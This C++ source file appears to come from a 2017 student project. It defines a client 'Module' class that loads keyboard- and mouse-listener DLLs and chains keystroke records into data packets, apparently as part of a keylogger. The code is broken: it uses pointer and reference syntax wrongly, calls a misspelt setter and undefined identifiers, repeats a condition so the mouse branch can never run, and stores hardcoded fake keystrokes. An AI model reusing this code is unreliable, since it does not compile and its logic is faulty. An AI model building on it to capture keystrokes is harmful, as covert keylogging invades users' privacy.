//
// Created by Thomas Lavigne & Axel Drozdzynski on 10/5/17.
//

#include "client/Module.hpp"


/* Constr & Destr*/
Module::Module()
{
}

Module::Module(char opcode, const std::string& filenameListener)
{
    this->_opcode = opcode;
    this->_filenameListener = filenameListener;
}

Module::Module(Module& copy)
{
    this._fileNameListener = copy.getFilenameListener();
    this._opcode = copy.getOpcode();
}

Module& Module::operator=(Module& mod)
{
    mod->setOpcode(this.getOpcode());
    mod->etFilenameListener(this.getFilenameListener());
    return (*this);
}

Module::~Module()
{
    unloadListener();
}

/*Getters & Setters*/
char    Module::getOpcode() const
{
    return _opcode;
}

void    Module::setOpcode(char op)
{
    /* if opcode is not defined we can define it */
    if (this->_opcode == 0)
    {
        this->_opcode = op;
        if (this->_opcode == OP_KEYBOARD)
            _filenameListener = "libKeyboardListener.dll";
        else if (this->_opcode == OP_KEYBOARD)
            _filenameListener = "libMouseClickListener.dll";
    }
}

/* Doing */
void    Module::addNextData(t_paquet *data)
{
    t_kbData *newData = new t_kbData;

    newData->timestamp = 193;
    newData->key_code = 'A';
    newData->next = data->kbData;
    data->kbData = newData;
}

std::string Module::getFilenameOutput()
{
    return (_listener->getFilenameOutput());
}

void Module::run()
{
    _listener->run();
}

size_t  Module::getDataSize()
{
    return (sizeof(t_kbData));
}

int    Module::loadListener()
{
    IListener* (*create)();

    _dll = LoadLibrary(_filenameListener);
    if (!hGetProcIDDLL)
    {
        std::cout << "Could not laod the dynamic library" << std::endl;
        std::cout << "<Enter> to quit" << std::endl;
        getchar();
        return (42);
    }
    create = (IListener* (*)())GetProcAddress(_dll, "create");

    if (!create)
    {
        std::cout << "could not locate the function"
                  << std::endl;
        std::cout << "<Enter> to quit" << std::endl;
        getchar();
        return (43);
    }
    _listener = (IListener*)create();
    return (0);
}

int     Module::unloadListener()
{
    void(*destroy)(IListener*);


    destroy = (void(*)(IListener*))GetProcAddress(_dll, "destroy");
    if (!destroy)
    {
        std::cout << "could not locate the function"
                  << std::endl;
        std::cout << "<Enter> to quit" << std::endl;
        getchar();
        return (43);
    }
    FreeLibrary(_dll);
    return (0);
}

void    Module::load(char opcode)
{
    setOpcode(opcode);
    loadLibrary();
}

